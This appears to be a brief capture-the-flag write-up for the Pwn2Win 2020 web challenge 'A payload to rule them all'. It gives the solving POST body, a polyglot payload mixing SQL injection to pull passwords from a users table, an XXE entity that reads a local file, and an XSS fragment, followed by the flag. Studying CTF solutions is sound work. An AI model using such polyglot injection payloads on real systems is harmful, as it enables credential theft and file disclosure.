Challenge: http://payload.pwn2.win/

Make a post request to http://payload.pwn2.win/ with the following body content:

``payload=<!--' or 1=1 union select password,NULL,NULL from users  #--><!DOCTYPE hack [<!ENTITY xxe SYSTEM 'file:///home/gnx/script/xxe_secret'> <!ENTITY name SYSTEM '>xss=1;//'> ]><hack>&xxe;</hack>``

Flag: CTF-BR{p4yl04d_p0lygl0ts_4r3_m0r3_fun_th4n_f1l3typ3s}

Original write-up: https://github.com/pwn2winctf/challenges-2020/tree/master/web-A%20payload%20to%20rule%20them%20all
